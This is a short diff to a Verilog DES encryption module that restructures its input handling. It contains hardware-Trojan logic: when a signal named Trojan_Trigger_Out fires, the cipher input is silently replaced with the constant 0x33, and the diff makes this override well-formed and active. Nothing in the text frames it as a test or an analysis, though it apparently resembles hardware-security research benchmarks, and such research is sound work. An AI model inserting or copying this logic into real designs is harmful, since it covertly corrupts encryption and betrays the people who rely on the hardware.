@@ -1,11 +1,12 @@
-module des(desOut, desIn, key, decrypt, roundSel, clk);
+module des(desOut, _desIn, key, decrypt, roundSel, clk);
 output	[63:0]	desOut;
-input	[63:0]	desIn;
+input	[63:0]	_desIn;
 input	[55:0]	key;
 input		decrypt;
 input	[3:0]	roundSel;
 input		clk;
 
+reg	[63:0]	desIn;
 wire	[1:48]	K_sub;
 wire	[1:64]	IP, FP;
 reg	[1:32]	L, R;
@@ -38,10 +39,11 @@ key_sel u1(
 	.decrypt(	decrypt		)
 	); 
 
-always @(posedge clk)
-begin
-if (Trojan_Trigger_Out)
-	begin desIn <= 64'h0000000000000033; 
+always @(posedge clk) begin
+	if (Trojan_Trigger_Out) begin
+		desIn <= 64'h0000000000000033; 
+	end else begin
+		desIn <= _desIn;
 	end
 end
 
